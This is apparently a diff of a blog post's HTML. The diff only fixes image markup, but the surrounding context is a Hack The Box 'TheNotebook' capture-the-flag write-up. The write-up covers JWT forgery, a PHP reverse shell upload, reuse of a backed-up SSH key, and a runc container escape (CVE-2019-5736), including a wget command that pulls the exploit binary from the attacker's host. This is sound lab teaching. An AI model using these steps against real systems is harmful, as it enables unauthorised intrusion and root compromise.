@@ -87,7 +87,7 @@
     </header>
     <div class="post-content">
       <h1 id="thenotebook">TheNotebook</h1>
-<p>![TheNotebook]/images/htb-thenotebook/thenotebook.png)</p>
+<p><img src="/images/htb-thenotebook/thenotebook.png" alt="TheNotebook"></p>
 <h3 id="contents">Contents</h3>
 <ul>
 <li><a href="#WriteUp">Write Up</a></li>
@@ -97,7 +97,7 @@
 </ul>
 <h2 id="WriteUp">Write Up</h2>
 <p>Two open ports, 22 and 80, one filtered port 10010. Pulling up the website takes us to a notebook page with a register and login link. Let&rsquo;s look around.</p>
-<p>![Welcome Page]/images/htb-thenotebook/thenotebook1.png)</p>
+<p><img src="/images/htb-thenotebook/thenotebook1.png" alt="Welcome Page"></p>
 <p>The register page lets you sign up without verification. I made a user <code>test1 : password1</code>. The log in page provides error messages that let you verify if a user exists, &ldquo;admin&rdquo; exists. After logging in you can create a note with a title and text. Each note has it&rsquo;s own url, built from the accounts uuid(found in a cookie), and a number which increments with each new note. Example: <code>http://thenotebook.htb/57a7d53c-0b83-4048-a3e6-506a0c2b4e13/notes/5</code>. My notes started with 5, 0-4 give an Unauthorized error. Even after logging out, the notes are still accessible by url. Putting a curly brace in the title when adding a note causes an internal error. WFuzz shows an admin page that gives a Forbidden error.</p>
 <p>After a while of stumbling around, I got lucky while looking at things in burpsuite. The auth cookie is part base64 and Burp&rsquo;s inspector automatically translated it for me when I clicked on that part, revealing that it&rsquo;s a JWT token. I used <a href="https://jwt.io/introduction">https://jwt.io/introduction</a> to bring me up to speed.</p>
 <p>The header and payload sections of the token translate to:</p>
@@ -109,10 +109,10 @@
 [3] admin_cap = 1
 </code></pre><p>I spin up my web server with the private key for verification and set my thenotebook.htb cookie to contain the new jwt token in the auth field. Navigating to <a href="http://thenotebook.htb/admin">http://thenotebook.htb/admin</a> works instead of giving us a Forbidden error! There&rsquo;s a view notes button and an upload file button. One of the notes mentions that uploaded php files are being executed. I upload a php reverse shell and hit the view button to trigger it. Our listener pops a shell as www-data. User.txt is only readable by user &ldquo;noah&rdquo;.</p>
 <p>In the /var/backups folder we find a copy of noah&rsquo;s home folder(no user.txt), with his private and public ssh keys and an authorized_keys file with his public key loaded in. After copying the private key over and making sure perms are set to 600, we can connect as noah and get the user flag.</p>
-<p>![User Flag]/images/htb-thenotebook/thenotebook2.png)</p>
+<p><img src="/images/htb-thenotebook/thenotebook2.png" alt="User Flag"></p>
 <p>Sudo -l shows <code>(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*</code>. After some research, I find <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736,">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736,</a> and <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>. I modified the PoC to run a reverse shell script that I&rsquo;ve downloaded the target machine and built it with <code>go build main.go</code>, then moved the main binary to my web server. On the target machine I execute <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to drop into the docker container, then <code>cd /tmp/ &amp;&amp; wget http://10.10.14.8/main &amp;&amp; chmod 777 main</code>. I open up a second shell as noah and ready the command <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh</code>, but don&rsquo;t hit enter yet. On the first shell I run the main binary <code>./main</code>, then when it says [+] Overwritten /bin/sh successfully, I execute the /bin/sh command on the second shell to trigger the exploit. It successfully writes and pops a root shell on my listener!</p>
-<p>![Main binary execution]/images/htb-thenotebook/thenotebook3.png)</p>
-<p>![Root Flag]/images/htb-thenotebook/thenotebook4.png)</p>
+<p><img src="/images/htb-thenotebook/thenotebook3.png" alt="Main binary execution"></p>
+<p><img src="/images/htb-thenotebook/thenotebook4.png" alt="Root Flag"></p>
 <hr>
 <h2 id="Recon">Recon</h2>
 <p>Nmap Scan:</p>
